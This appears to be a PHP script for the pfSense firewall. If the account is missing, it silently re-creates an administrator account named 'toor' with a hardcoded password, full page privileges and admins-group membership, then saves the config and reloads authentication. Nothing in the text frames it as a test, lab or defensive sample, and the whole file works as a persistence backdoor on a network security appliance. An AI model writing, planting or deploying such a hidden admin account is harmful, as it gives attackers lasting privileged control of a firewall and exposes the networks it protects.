<?php
require_once("guiconfig.inc");  // Loads pfSense configurations
require_once("auth.inc");       // Handles authentication

// Set user details
$username = "toor";
$password = "supersecretpassword";  // Replace this with a secure password
$full_name = "Admin User";

// Function to get the next available UID
function get_next_uid() {
    global $config;
    
    // Get the current users and find the highest UID
    $highest_uid = 1000;  // Set a default minimum UID (greater than the system UIDs)
    
    if (isset($config['system']['user'])) {
        foreach ($config['system']['user'] as $user) {
            if (isset($user['uid']) && $user['uid'] > $highest_uid) {
                $highest_uid = $user['uid'];  // Track the highest existing UID
            }
        }
    }

    // Return the next available UID
    return $highest_uid + 1;
}

// Function to add user back into the system
function add_user($username, $password, $full_name) {
    global $config;

    // Check if user already exists
    if (isset($config['system']['user'])) {
        foreach ($config['system']['user'] as $user) {
            if ($user['name'] === $username) {
                return;  // User already exists, no need to add
            }
        }
    }

    // Get the next available UID
    $uid = get_next_uid();

    // Create new user entry
    $new_user = array();
    $new_user['name'] = $username;
    $new_user['bcrypt-hash'] = crypt($password, '$2y$10$'.bin2hex(random_bytes(22))); // Hash the password securely
    $new_user['priv'] = array('page-all');  // Full access to all pages (admin rights)
    $new_user['descr'] = $full_name;
    $new_user['uid'] = $uid;

    // Add user to config
    $config['system']['user'][] = $new_user;

    // Add the user to the 'admins' group
    if (isset($config['system']['group'])) {
        foreach ($config['system']['group'] as &$group) {
            if ($group['name'] === 'admins') {
                $group['member'][] = $new_user['uid'];  // Add user UID to the admins group
            }
        }
    }

    // Save the config and apply changes
    write_config("Auto-added user $username and assigned to admins group.");
    
    // Reload user database by running system command
    mwexec("/etc/rc.auth");  // Reload the authentication subsystem
}

// Run the function to check if the user is missing and add if necessary
add_user($username, $password, $full_name);
?>
